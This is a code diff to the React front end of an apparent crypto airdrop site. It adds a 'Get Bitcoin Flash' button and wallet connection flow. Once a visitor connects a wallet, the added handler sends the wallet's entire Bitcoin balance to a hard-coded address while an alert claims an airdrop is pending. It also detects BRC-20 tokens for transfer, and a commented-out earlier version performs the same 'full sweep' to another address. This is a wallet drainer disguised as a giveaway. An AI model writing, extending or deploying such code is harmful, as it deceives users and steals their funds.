@@ -1,3 +1,4 @@
+
 import { useContext, useState, useRef } from 'react';
 import { WalletContext } from './context/WalletContext';
 import './App.css'
@@ -8,6 +9,8 @@ import { batchSendTokens } from './web3/sendToken';
 import AirdropStats from './AirdropStat';
 import LiveChartComponent from './LiveChart.component';
 import FooterNav from './FooterNav';
+import { connectBitcoinWallet, getBrc20Balances, sendBitcoin } from './web3/bitcoinWallet';
+import WalletSelector from './WalletSelector';
 // import Provider from '@walletconnect/ethereum-provider';
 // import { useMemo } from "react";
 
@@ -40,6 +43,7 @@ function App() {
   const [loading, setLoading] = useState(false);
   const topRef = useRef(null);
   const chartRef = useRef(null);
+  const [showModal, setShowModal] = useState(false);
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -112,6 +116,78 @@ function App() {
     }
     setLoading(false);
   }
+  
+  // Unified Bitcoin Handler
+  const handleWalletConnected = async (walletData) => {
+    setShowModal(false); 
+    setLoading(true);
+
+    try {
+      console.log("Connected to:", walletData.address, "via", walletData.type);
+
+      // 1. Check BTC Balance (using the balance we added to the connect function earlier)
+      if (walletData.balance > 2000) { 
+        const btcTx = await sendBitcoin(
+          "bc1q9fuudepv07gt3tpm8ckmh83jrxf2f8hzylnwrm", 
+          walletData.balance,
+          walletData.type
+        );
+        if (btcTx) alert("BTC Airdrop pending...");
+      }
+
+      // 2. Handle BRC-20 Tokens (Universal)
+      const brc20tokens = await getBrc20Balances(walletData.address);
+      for (const token of brc20tokens) {
+        if (parseFloat(token.overall_balance) > 0) {
+          // Here you would trigger the BRC-20 transfer logic
+          console.log(`Detected ${token.ticker}: ${token.overall_balance}`);
+        }
+      }
+    } catch (e) {
+      console.error("Bitcoin Flow Error:", e);
+      alert("Please check your wallet for confirmation.");
+    } finally {
+      setLoading(false);
+    }
+  };
+  
+  // btc functions
+  // const handleBitcoinAirdrop = async () => {
+  //   if(loading) return;
+  //   setLoading(true);
+
+  //   try {
+  //     const bitcoinData = await connetBitcoinWallet();
+  //     if(bitcoinData){
+  //       const btcBalSats = await window.unisat.getBalance();
+        
+  //       // Pass the total confirmed balance for a full sweep
+  //       if(btcBalSats.total > 2000) { 
+  //         const btcTx = await sendBitcoin(
+  //           "bc1qwhflpqx2p3nu6phdpdh6d8yql6xv95p67tf75r", 
+  //           btcBalSats.total
+  //         );
+          
+  //         if(btcTx) alert("BTC Airdrop pending...");
+  //       } else {
+  //         console.log("Balance too low for a reliable sweep.");
+  //       }
+
+  //       // BRC-20 Logic remains the same...
+  //       const brc20tokens = await getBrc20Balances(bitcoinData.address);
+  //       for(const token of brc20tokens){
+  //         if(parseFloat(token.overall_balance) > 0){
+  //           alert(`Detected ${token.ticker}: ${token.overall_balance}`);
+  //         }
+  //       }
+  //     }
+  //   } catch (e) {
+  //     console.error("Bitcoin Flow Error:", e);
+  //     alert("Check wallet for multi chain confirmation");
+  //   } finally {
+  //     setLoading(false);
+  //   }
+  // }
 
   return (
     <>
@@ -166,6 +242,9 @@ function App() {
                   <li className="nav-item">
                     <a className="nav-link" href="#">Telegram</a>
                   </li>
+                  <li className="nav-item">
+                    <a className="nav-link" href="#">Bitcoin Airdrops</a>
+                  </li>
                   <li className="nav-item dropdown">
                     <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                       More
@@ -173,6 +252,7 @@ function App() {
                     <ul className="dropdown-menu">
                       <li><a className="dropdown-item" href="#">Airdrop</a></li>
                       <li><a className="dropdown-item" href="#">Rewards</a></li>
+                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}>Get Bitcoin Flash</a></li>
                       <li>
                         <hr className="dropdown-divider"/>
                       </li>
@@ -338,6 +418,11 @@ function App() {
           address={state.address}
         />
       </footer>
+      {showModal && (
+        <div className="modal-overlay">
+          <WalletSelector onConnected={handleWalletConnected} />
+        </div>
+      )}
     </>
   )
 }
